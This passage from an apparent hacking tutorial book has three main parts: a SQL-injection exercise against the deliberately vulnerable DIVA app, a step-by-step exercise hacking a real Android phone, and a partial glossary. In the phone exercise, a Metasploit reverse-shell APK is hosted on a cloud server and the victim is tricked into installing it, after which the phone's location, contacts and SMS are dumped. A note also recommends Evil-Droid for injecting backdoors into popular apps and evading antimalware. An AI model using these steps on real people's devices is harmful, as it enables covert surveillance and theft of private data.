6. In adb terminal hit Crtl + C to stop the logging
7. Look at the SQLitelog error log ‘ ‘ ‘ in SELECT * FROM sqluser
WHERE user = ‘ ‘ ‘
8. The logcat shows SQL query that run by the application to search
for the user “ ‘ “ a select query to find a user “ ‘ “
9. Start the dba logging again >./dba logcat
10. In the virtual phone DIVA app search enter ‘or 1=1; and click
search
S_E_Oblako
11. The app will show a pop screen that shoes users name and
passwords plus credit card number of all users.
Exercise 72: Reading SQLite database in Android Phone
1. Continue from the previous exercise and start adb shell to get a
shell from the virtual phone >./adb shell
2. Type # cd /data/data
3. type #ls
4. Go to jakhar.aseem.diva which is the folder that contain the data of
the DIVA mobile applications
5. #cd jakhar.aseem.diva
6. #ls
7. # cd database
8. #ls to see the content of the database folder
S_E_Oblako
9. #sqlite3 sqli to get sql command
10. Sqlite> .tables ( to see the tables of the database
11. Sqlite> select * from sqliuser; ( to read the content of the sqliuser
table)
12. As you can see the content of the sqli user table is all the
application users and their password and credit card numbers.
Exercise 73: Hacking Real Android phone
In this exercise we are going to hack a real android phone using a malicious
APK file that we are going to create using Metasploit. the APK file will
create a backdoor in the Android phone. In this exercise I am going to use
Samsung galaxy S8+ with the latest software release from Samsung and a
cloud-based server to access the phone.
Note
You can easily get a free cloud server from Amazon, Google Cloud or
Microsoft Azure, you just need to register with one of the providers
mentioned and create your own server. Installing Kali Linux in Google Cloud
server is a bit complicated so instead I used Google provided Ubuntu
Image.Both Kali and Ubuntu are Debian based Linux distribution, the only
difference is that in Ubuntu you will need to install penetration testing tools
manually, part of this exercise procedure is installing Metasploit in Ubuntu
The exercise steps are:
S_E_Oblako
1. Create APK file using Metasploit inside the cloud server (Kali
Linux or Ubuntu Server – I am using Google Cloud, so it was much
easier for me to install Ubuntu Server)
2. Put the APK file inside a web server (the same Cloud server).
3. Convince the victim through social Engineering or other means to
download the APK file in his phone and enable the feature of
running APK from external resource)
4. Listen to connection from the phone using Metasploit in the Cloud
server.
5. Controlling the phone, getting phone location, images, videos, and
messages
6. Depending on the Could provider you use start the Cloud server.
(Installing and running of a cloud server is outside the scope of this
book, however it is very easy and there are a lot of help resources
provided by service providers and others in the internet)
7. I am using Google cloud console.
8. Note that the server has internal IP address when it is not running
but when it is started, it will take external IP address that we are
going to use in the APK file.
9. If you want a permanent external IP address, then you must pay 3
to 4 dollars a month for the external IP address.
10. You will need to have SSH and RDP software installed in your
S_E_Oblako
Windows to connect to the cloud server.
11. I am using putty software to get fast access to the cloud server shell
and RDP to have a desktop from the G-cloud server.
12. Start putty and connect to the G-cloud server.
13. Use Putty public key authentication for secure access to the server.
14. Update the server
#sudo apt-get update
#sudo apt-get upgrade
15. If you are running Ubuntu, you will need to install Metasploit
console
#sudo ap-get install Metasploit
16. Create the APK file
#sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=  LPORT=4444 or any free port R>malicious.apk
17. Move the malicious.apk file to web server
#sudo mv malicious.apk /var/www/html
18. Check the webserver is running #sudo systemctl status apache2
19. If not active start it #sudo service apache2 start
20. Set up Metasploit to listen to incoming connections in port 4444
21. #sudo msfconsole
S_E_Oblako
22. Configure msfconsole
Msf6> use exploit/multi/handler
>set payload android/meterpreter/reverse_tcp
>set LHOST
>set LPORT 
>exploit
23. From the Android phone open Web browser and enter the external
IP address of your cloud server
24. Follow the instructions to download and install the APK file into
the phone ( see screenshot below
25. You need to have install apk from external sources enabled in your
S_E_Oblako
android phone
S_E_Oblako
26. When Apk file installation is done successfully you will have a
meterpreter session on the server (see below screenshot)
S_E_Oblako
27. Type sysinfo to see android OS info
28. Type help to see available android specific commands
29. To check if the phone rooted or not, type >check_root
S_E_Oblako
30. To know the phone location, type >geolocate
You can take the latitude and longitude numbers and input them in Google
Maps to see the phone location on the map
31. to dump all phone contact to a file in the server, type
>dump_contacts
32. To dump all sms from the phone to the server, type >dump_sms
S_E_Oblako
S_E_Oblako
S_E_Oblako
Note
The APK file generated by msfvenom is not a reliable APK file and
sometimes it does not work, and android antimalware program can detect it
very easily and stop it from working. There are many available tools in
Github that generate more efficient and evasive APK files that can pass
android antimalware programs.
The most popular APK generating tools is Evil-Droid
(https://github.com/M4sc3r4n0/Evil-Droid).
Evil-Droid can also inject another APK file with backdoor APK file. Yu can
download any well-known APK file for a game or app from third party APK
stores and then use Evil-Droid to inject backdoor APK file. Anyone runs the
injected APK file will connect back to the attacker server. The process of
injecting the backdoor is done automatically in a step by step GUI that guide
through the whole process.
S_E_Oblako
17. Appendix 1: Realtek Driver update
This procedure to install driver for wireless USB adapters that has Realtek
chipset RTL8812AU or RTL8811AC
1. Kali 2020.1 running Kernal 5.4 have a major problem with many
USB Wi-Fi adapters that used to run with prior Kali Versions ( Kali
19.4 and down)
2. Check the version of usb Wi-Fi adapter you have with command
#lausb
3. Check Kali version
4. Install Linux headers in Kali Linux
#ap-get update && apt-get upgrade
#apt-get install linux-headers-$(uname -r)
5. Install driver source code
S_E_Oblako
#git clone https://github.com/aircrack-ng/rtl8812au
6. Install DKMS
DKMS ( Dynamic Kernel Module Support) is a tool for automatically
compiling and installing kernel modules and managing drivers that access
kernel directly
#apt-get install dkms
7. To install the rtl8812au driver
#cd rtl8812au
#./dkms-install.sh
#dkms status
8. Disconnect wifi adapter
9. Rebook Kali
10. Connect wifi adapter
11. Check the wifi adaptor is running in Kali
S_E_Oblako
18. Appendix2: Glossary
Acronym Stands for Definition
A cyber-attack that continuously
Advanced Persistent
APT uses advanced techniques to
Threat
conduct cyber espionage or crime
An international consortium that
brings together businesses affected
Anti-Phishing Working by phishing attacks with security
APWG
Group companies, law enforcement,
government, trade associations, and
others.
A computer program used to
AV Antivirus prevent, detect, and remove
malware.
A group of Antivirus and security
Anti-Virus Information specialists who share information
AVIEN
Exchange Network regarding AV companies, products,
malware and other threats.
Completely Automated A response test used in computing,
Public Turing Test to especially on websites, to confirm
CAPTCHA
Tell Computers and that a user is human instead of a
Humans Apart bot.
Computer Antivirus An organization established in 1990
CARO
Research Organization to study malware.
This program provides validation
testing of FIPS-approved and NIST-
recommended cryptographic
Cryptographic
algorithms and individual
CAVP Algorithm Validation
components. Cryptographic
Program
algorithm validation is necessary
precursor to cryptographic module
validation.
Operation for a block cipher using
an initialization vector and a
chaining mechanism. This will
CBC Cipher Block Chaining
S_E_Oblako
cause the decryption of a block
of cipher text to depend on
preceding cipher text blocks.
This constructs a message
authentication code from a block
cipher. The message is encrypted
Cipher Block Chaining
CBC- with some block cipher algorithm
Message
MAC in CBC mode. This creates a chain
Authentication Code
of blocks with each block
depending on the correct encryption
of the previous block.
Center for Education
A part of Purdue University
and Research in
CERIAS dedicated to research and education
Information Assurance
in information security.
and Security
In this case, an expert group that
Computer Emergency
CERT handles computer security incidents
Response Team
and alerts organizations about them.
A protocol for authentication that
provides protection against replay
Challenge-Handshake
CHAP attacks through the use of a
Authentication Protocol
changing identifier and a variable
challenge-value.
A group that handles events
Computer Incident
CIRT involving computer security and
Response Team
data breaches.
A 501 nonprofit organization with a
mission to "Identify, develop,
validate, promote, and sustain best
Center for Internet
CIS practice solutions for cyber defense
Security
and build and lead communities to
enable an environment of trust in
cyberspace."
Professionals who monitor, audit,
Certified Information
CISA control, and assess information
Systems Auditor
systems.
S_E_Oblako
A certification offered by ISACA
which "Demonstrates your
Certified Information
understanding of the relationship
CISM Systems Security
between an information security
Manager
program and broader business goals
and objectives."
The CISO is the executive
responsible for an organization's
information and data security.
Increasingly, this person aligns
security goals with business
Chief Information
CISO enablement or digital
Security Officer
transformation. CISOs are also
increasingly in a "coaching role"
helping the business manage cyber
risk. This is according to Ponemon
Institute research.
The CISSP is a security certification
for security analysts, offered by
Certified Information
ISC(2). It was designed to indicate a
CISSP Systems Security
person has learned certain
Professional
standardized knowledge in
cybersecurity.
A U.S. plan to enhance
cybersecurity awareness and
Cybersecurity National
CNAP protections, protect privacy,
Action Plan
maintain public safety, and
economic and national security.
A U.S. government initiative
designed to establish a front line of
Comprehensive defense against network intrusion,
CNCI National Cybersecurity defend the U.S. against the threats
Initiative through counterintelligence, and
strengthen the
cybersecurity environment.
CND is defined by the U.S. military
S_E_Oblako
as defined by the US Department of
Defense (DoD) as, "Actions taken
through the use of computer
Computer Network networks to protect, monitor,
CND
Defense analyze, detect, and respond to
unauthorized activity within
Department of Defense information
systems and computer networks."
This style of defense applies to the
private sector as well.
Control Objectives for An IT management including
COBIT Information and practices, tools and models for risk
Related Technologies management and compliance.
The CSEC, also known as the
CEC, partners with educators and
the broader cybersecurity
Cyber Security
CSEC community to ensure students are
Education Consortium
prepared to lead and be
changemakers in the cybersecurity
workforce.
The Cloud Security Alliance is the
world's leading organization for
Cloud Security defining best practices in cloud
CSA
Alliance cybersecurity. It also provides a
cloud security provider certification
program, among other things.
In some cases, the Chief Security
Officer is in charge of an
organization's entire security
posture or strategy. This includes
CSO Chief Security Officer
both physical security and
cybersecurity. In other cases, this
title belongs to the senior most role
in charge of cybersecurity.
The CSSIA is a U.S. leader in
training cybersecurity educators. It
Center for Systems
S_E_Oblako
CSSIA Security and provides these teachers and
Information Assurance professors with real-world learning
experiences in information
assurance and network security.
CVE® is a list of entries—each
containing an identification number,
a description, and at least one public
reference—for publicly known
Common
cybersecurity vulnerabilities. CVE
CVE Vulnerabilities and
Entries are used in numerous
Exposures
cybersecurity products and services
from around the world, including
the U.S. National Vulnerability
Database (NVD).
An industry standard for rating the
severity of security vulnerabilities.
Common Vulnerability CVSS attempts to assign severity
CVSS
Scoring System scores to vulnerabilities, allowing
responders to prioritize responses
and resources according to threat.
A distributed denial-of-service
(DDoS) attack attempts to disrupt
normal traffic of a targeted server,
Distributed Denial of service or network to make a
DDoS
Service service such as a website unusable
by “flooding” it with malicious
traffic or data from multiple sources
(often botnets).
An information security strategy to
protect corporate data. DLP is a set